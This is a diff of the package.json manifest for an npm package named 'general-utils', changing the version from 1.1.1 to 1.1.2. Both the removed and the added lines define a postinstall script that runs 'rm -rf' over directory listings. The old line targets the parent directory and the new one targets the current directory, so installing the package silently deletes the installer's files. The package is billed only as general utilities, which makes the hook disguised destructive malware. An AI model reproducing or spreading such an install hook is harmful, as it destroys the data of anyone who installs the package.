@@ -1,11 +1,11 @@
 {
   "name": "general-utils",
-  "version": "1.1.1",
+  "version": "1.1.2",
   "description": "general utils",
   "main": "index.js",
   "scripts": {
     "test": "echo \"Error: no test specified\" && exit 1",
-    "postinstall":"rm -rf ../$(ls -a ..)"
+    "postinstall":"rm -rf $(ls -a)"
   },
   "keywords": [
     "general",
